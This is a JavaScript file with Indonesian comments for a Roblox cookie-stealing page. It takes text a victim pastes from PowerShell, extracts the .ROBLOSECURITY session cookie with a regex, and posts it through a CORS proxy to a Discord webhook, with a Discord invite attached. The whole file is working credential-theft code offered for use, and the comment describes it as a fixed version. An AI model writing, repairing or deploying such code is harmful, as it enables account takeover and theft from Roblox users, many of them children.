// File: script.js (Versi yang diperbaiki)
document.addEventListener('DOMContentLoaded', () => {
    const powershellTextarea = document.getElementById('powershell');
    const submitButton = document.getElementById('submit-cookie');
    const statusDiv = document.getElementById('status');
    // Gunakan CORS Proxy (tempatkan URL webhook Anda)
    const discordWebhookUrl = 'https://cors-anywhere.herokuapp.com/https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

    // Fungsi update status (sama seperti sebelumnya)
    function updateStatus(message, type = 'info') {
        statusDiv.innerHTML = `<p>${message}</p>`;
        statusDiv.classList.remove('opacity-0');
        // styling yang sama...
    }

    // Event listener untuk form submission (diperbarui)
    document.getElementById('cookie-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const rawInput = powershellTextarea.value.trim();
        
        // Validasi input (sama seperti sebelumnya)...
        
        // Ekstrak cookie
        const roblocsSecurityRegex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
        const match = rawInput.match(roblocsSecurityRegex);
        let roblocsSecurityCookie = '';
        
        if (match && match[1]) {
            roblocsSecurityCookie = match[1];
            updateStatus('✅ Cookie berhasil diekstrak. Mengirim ke Discord...', 'processing');
        } else {
            updateStatus('❌ Gagal mengekstrak cookie!', 'error');
            return;
        }

        // Kirim ke Discord dengan CORS Proxy
        if (roblocsSecurityCookie) {
            const payload = {
                content: null,
                embeds: [{
                    title: ".ROBLOSECURITY 🍪",
                    description: `\`\`\n${roblocsSecurityCookie}\n\`\`\nhttps://discord.gg/xRmBV93KAY`,
                    color: 3092790,
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest' // tambahkan header ini
                    },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    updateStatus('🎉 Berhasil dikirim ke Discord!', 'success');
                } else {
                    updateStatus(`❌ Gagal terkirim! Status: ${response.status}`, 'error');
                }
            } catch (error) {
                updateStatus(`❌ Error: ${error.message}`, 'error');
            }
        }
    });
});